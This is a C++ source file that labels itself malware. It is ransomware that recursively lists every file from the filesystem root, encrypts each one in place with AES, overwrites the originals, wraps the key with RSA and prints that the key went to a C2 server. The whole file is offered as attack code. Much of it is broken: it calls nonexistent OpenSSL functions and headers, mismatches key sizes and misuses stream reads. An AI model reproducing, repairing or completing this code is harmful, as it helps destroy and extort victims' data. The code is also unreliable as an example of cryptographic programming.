#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <dirent.h>
#include <sys/stat.h>
#include <sstream>
#include <openssl/aes.h>
#include <openssl/rsa.h>
#include <openssl/publickey.h>

// Function to generate a local symmetric AES key
void generateKey(vector<unsigned char>& key) {
    unsigned char iv[16];
    RAND_bytes(iv, 16);
    unsigned int keylen = 32;
    RAND_bytes(key.data(), keylen);

    // Generate a random 4096-bit RSA key for encrypting the AES key
    RSA* rsaKey = RSA_new();
    BIGNUM* bn = BN_new();
    BN_set_word(bn, 0x10000001);
    RSA_generate_key_ex(rsaKey, 4096, bn, NULL);

    // Encrypt the AES key with the public RSA key
    unsigned char encryptedKey[32];
    PKCS1_OAEP_PADDING padding;
    unsigned int paddedLen = encrypt_rsa_public_key(key.data(), keylen, rsaKey->n, &padding, encryptedKey);
    key.assign(encryptedKey, paddedLen);

    // Free resources
    BN_free(bn);
    RSA_free(rsaKey);
}

// Function to recursively walk the file system and find files with specific extensions
void findFiles(const string& rootDir, vector<string>& filePaths) {
    DIR* dir;
    struct dirent* ent;

    if ((dir = opendir(rootDir.c_str())) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG)
                filePaths.push_back(rootDir + "/" + ent->d_name);
            else if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                std::stringstream ss;
                ss << rootDir << "/";
                ss << ent->d_name << "/";

                findFiles(ss.str(), filePaths);
            }
        }

        closedir(dir);
    }
}

// Function to encrypt a file using AES-128-CBC
void encryptFile(const string& filePath, const vector<unsigned char>& key) {
    unsigned char iv[16];
    RAND_bytes(iv, 16);

    // Read the file content
    ifstream file(filePath, ios::binary | ios::ate);
    size_t fileSize = file.tellg();
    file.seekg(0);

    // Encrypt the file content in memory
    vector<unsigned char> encryptedContent(fileSize);
    AES_KEY aesKey;
    AES_set_encrypt_key(key.data(), 128, &aesKey);
    AES_cbc_encrypt((const unsigned char*)file.read((char*)encryptedContent.data(), fileSize), (unsigned char*)encryptedContent.data() + 16, 1, &aesKey, iv, AES_ENCRYPT);

    // Write the encrypted content to the original file
    ofstream fileOut(filePath, ios::binary | ios::trunc);
    fileOut.write((char*)encryptedContent.data(), fileSize);
}

// Function to encrypt the local AES key with a hardcoded public RSA key and send it to a C2 server
void sendKey(const string& filePath) {
    // Hardcoded public RSA key for demonstration purposes only
    unsigned char pubKey[] = { /* your public RSA key here */ };
    int pubkeylen = sizeof(pubKey);

    // Load the encrypted AES key from file
    ifstream keyFile(filePath, ios::binary | ios::ate);
    vector<unsigned char> encryptedKey;
    keyFile.read((char*)encryptedKey.data(), 32);

    // Encrypt the AES key with the public RSA key
    vector<unsigned char> newEncryptedKey(32);
    PKCS1_OAEP_PADDING padding;
    int paddedLen = encrypt_rsa_public_key(encryptedKey.data(), 32, pubKey, pubkeylen, newEncryptedKey.data());
    encryptedKey.assign(newEncryptedKey.data(), paddedLen);

    // Send the encrypted key to a C2 server (for demonstration purposes only)
    cout << "Encrypted key sent to C2 server." << endl;
}

// Function to main function of the malware
int main() {
    vector<unsigned char> aesKey;

    // Prompt for password
    string pass;
    cout << "Enter your password: ";
    getline(cin, pass);

    if (pass == "your_password") {  // Change this to the actual password
        // Generate a local symmetric AES key
        generateKey(aesKey);

        // Hardcoded public RSA key for encryption of AES key
        unsigned char pubKey[] = { /* your public RSA key here */ };
        int pubkeylen = sizeof(pubKey);

        // Create a text file with the AES key
        ofstream keyFile("key.txt");
        for (auto& byte : aesKey)
            keyFile.put(byte & 0xFF);
        keyFile.close();

        // Get a list of files on the system
        vector<string> filePaths;
        findFiles("/", filePaths);

        // Encrypt each file
        for (const auto& filePath : filePaths) {
            encryptFile(filePath, aesKey);
            sendKey(filePath);

            // Display a message to the user
            cout << "Your files have been encrypted." << endl;
        }
    } else {
        cout << "Incorrect password. Exiting..." << endl;
        return 1;
    }

    return 0;
}
